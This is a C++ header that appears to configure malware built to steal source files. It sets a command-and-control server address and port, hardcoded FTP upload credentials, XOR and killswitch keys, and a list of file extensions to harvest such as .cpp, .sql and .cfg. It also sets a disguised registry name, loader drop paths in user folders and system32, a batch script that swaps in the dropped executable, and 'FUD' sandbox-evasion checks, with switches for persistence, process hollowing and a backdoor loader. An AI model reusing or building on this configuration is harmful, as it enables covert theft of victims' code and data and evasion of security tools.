#pragma once
#include <fstream>
#include <vector>
#include <string>
//////////////////////////////////////////////////////////////////////////
// Xor encoder keys
const long long packet_crypto_key = 0x443d13eb0c2493a7;


//////////////////////////////////////////////////////////////////////////
// Key used for the killswitch
const unsigned long long killswitch_key = 0xd767691454256aec;

//////////////////////////////////////////////////////////////////////////
// Settings for the FTP upload system
#define FTP_UPLOAD_THREADS_COUNT 5

 #define LOCAL_TEST

#ifndef LOCAL_TEST
#define CNC_SERVER_IP "145.0.0.0"
#else
#define CNC_SERVER_IP "127.0.0.1"
#endif

#define CNC_SERVER_PORT "55056"

#ifdef CPP_SCANNER_SERVER
#define FTP_UPLOAD_IP CNC_SERVER_IP
#define FTP_UPLOAD_PORT 21
#define FTP_UPLOAD_USERNAME "Loki"
#define FTP_UPLOAD_PASSWORD "L0K1"
#endif // CPP_SCANNER_SERVER

//////////////////////////////////////////////////////////////////////////
// Controller authkey

const unsigned char controller_authkey_xor_checksum = 0x29;
const unsigned char controller_authkey_xor_start = 0x9F;
const unsigned char controller_authkey_sum_start = 0x06;
const unsigned char controller_authkey_sum_checksum = 0x76;

#ifdef CPP_SCANNER_CLIENT
#if defined(_DEBUG) && !defined(ENABLE_PRINTF)
#define ENABLE_PRINTF
#endif
#endif // CPP_SCANNER_CLIENT

#define MUTEX_NAME "HSjLm2vm937yU7ebkTqa"

const std::vector<unsigned long long> whitelist_hwid = {
	3608073153161134086,
	2510320714896114771,
	6463073811132045328,
	16505538070049934116,
	5811740755507830382,
	10637066239009248612
};

static bool is_whitelisted_hwid(unsigned long long hwid) { for (auto& entry : whitelist_hwid) if (entry == hwid) return true; return false; }

const std::string sensible_file_extension[] = {
	".cpp",
	".h",
	".c",
	".hpp",
	".cs",
	".vb",
	".php",
//	".py",
	".sln",
	".cfg",
	".bak",
	".sql",
	".sma",
	".resx",
	".vcxproj",
	".csproj"
};

const std::string ignored_paths[] = {
	"WINDOWS",
	"Program Files",
	"Program Files (x86)"
};

#define APP_NAME_FOR_WINREG L"Windows Recognition Service"
#define LOADER_DROP_PATH "C:\\Users\\%s\\bfs.exe"
#define LOADER_DROP_PATH_ADMIN L"C:\\Windows\\system32\\bfs.exe"
#define LOADER_DROP_BATCH	"@echo off\r\n" \
							"taskkill /f /im %s\r\n" \
							"copy %s %s\r\n" \
							"erase %s\r\n" \
							"start %s\r\n"

#define BATCH_CMD_LINE "cmd.exe /C %s"

#define SPEEDTEST_BUFFER_SIZE 1000000
#define SPEEDTEST_RUN_COUNT	3
#define SPEEDTEST_TOTAL_BYTES (SPEEDTEST_BUFFER_SIZE * SPEEDTEST_RUN_COUNT)
// #define PERSISTENCY

//#define FUD

#ifdef FUD
#define NUMA_CHECK_PAGE_SIZE 1000
#define WEB_PAGE_CHECK_URL "http://www.domainchecks12.com/"
#define LOOP_CHECK_COUNT 100000000
#define MEMORY_CHECK_SIZE 100000000
#define PROCESS_MEMORY_CHECK_SIZE 3500000
#define TIME_CHECK_SLEEP_TIME 1000
#define TIME_CHECK_THRESHOLD_1 1000
#define TIME_CHECK_THRESHOLD_2 1100
#define PROCESS_ACCESS_CHECK_PID 4
#endif // FUD

// #define PROCESS_HOLLOWING 

#ifndef PROCESS_HOLLOWING
#define DROP_FILE_PATH ".\\CR_Security_Starter.exe"
#endif

// #define BACKDOOR_LOADER